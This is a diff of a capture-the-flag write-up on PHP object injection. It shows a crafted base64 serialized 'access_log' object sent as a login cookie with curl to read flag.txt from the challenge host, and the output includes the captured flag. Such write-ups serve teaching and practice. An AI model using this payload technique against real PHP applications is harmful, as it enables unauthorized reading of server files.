@@ -45,11 +45,12 @@ if(isset($_COOKIE["login"])){
 > If cannot unserialize! --> print the object to screen
 
 If you try to serialize yourself on local enviroment `$php -a`, you'll get something like this:
-> TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO047czo4OiJwYXNzd29yZCI7Tjt9<br>
+> TzoxMToicGVybWlzc2lvbnMiOjI6e3M6ODoidXNlcm5hbWUiO047czo4OiJwYXNzd29yZCI7Tjt9
+
 Base64 decode, which is the serialized object:
 > O:11:"permissions":2:{s:8:"username";N;s:8:"password";N;}
 
-By default, the website will serialize **permission** then deserialize it. 
+By default, the website will serialize **permission** object then deserialize it. 
 
 What if... we change **permission** object to **access_log** object?
 
@@ -63,7 +64,7 @@ Base64 encode:
 
 Now we need to add the cookie and let it run the *print object* in `cookie.php`, but we need to request to `authentication.php` first to load the object structure.
 
-```bash
+```fish
 $ curl http://chall4.ctf.night-wolf.io/authentication.php -b 'login="TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo4OiJmbGFnLnR4dCI7fQo="'
 Deserialization error. FNW_CTF{pHp_0bj4ct_inj4ct10n_vu1n}
 ```
